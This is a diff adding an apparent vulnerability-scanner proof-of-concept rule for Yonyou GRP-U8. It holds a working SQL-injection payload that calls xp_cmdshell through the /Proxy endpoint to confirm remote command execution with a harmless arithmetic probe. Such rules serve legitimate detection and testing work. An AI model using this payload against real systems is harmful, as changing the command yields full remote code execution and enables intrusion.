@@ -1,0 +1,16 @@
+name: poc-yaml-yonyou-grp-u8-sqli-to-rce
+set:
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
+rules:
+  - method: POST
+    path: /Proxy
+    follow_redirects: false
+    body: |
+      cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'set/A {{r1}}*{{r2}}'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://www.hackbug.net/archives/111.html
